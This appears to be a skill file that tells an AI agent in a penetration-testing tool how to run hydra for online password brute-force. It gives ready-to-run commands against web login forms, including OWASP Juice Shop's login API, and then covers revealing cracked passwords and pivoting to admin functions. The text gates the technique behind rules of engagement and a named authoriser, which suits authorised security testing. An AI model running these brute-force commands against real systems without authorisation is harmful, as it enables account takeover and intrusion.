---
model: haiku
---

# hydra — online credential brute-force (T1110, CWE-307)

Guess valid login/password pairs against a live authentication endpoint — a web form, HTTP basic auth,
or a network service. Exploitation tier — the ROE must allow-list T1110 and name an authoriser.

Run — the target is the **host**; the service, form spec and login/password lists are hydra's own flags
after `--`:

    searu run hydra --technique T1110 --target host -- -s 443 -l admin \
      -P seclists:Passwords/Common-Credentials/Pwdb_top-10000.txt \
      http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid credentials'

The last field is the condition. Use `F=<text>` (fail-string) only when a failed login returns 200 with
that text in the body. A JSON/REST login usually answers a failure with 401/403, and hydra treats any
non-2xx as a hard error and never checks the fail-string — so a fail-string silently matches nothing.
For those, match the **success** response instead with `S=<text>` (a string present only on success, e.g.
a token field). Juice Shop's `/rest/user/login` is exactly this case:

`http-post-form '/rest/user/login:{"email"\:"^USER^","password"\:"^PASS^"}:H=Content-Type\: application/json:S=authentication'`
(escape colons inside the body/header with `\:`; the `S=`/`F=` condition goes last). Read results:

    searu findings --tool hydra     # a weak-credentials finding per cracked account
    searu loot --reveal             # the cracked passwords (stored as loot, never in the finding)

Log in with the cracked credential and pivot to the authenticated attack surface (IDOR, admin functions)
within the ROE. Do not paste raw hydra output. See `searu tool advice hydra` for detail.
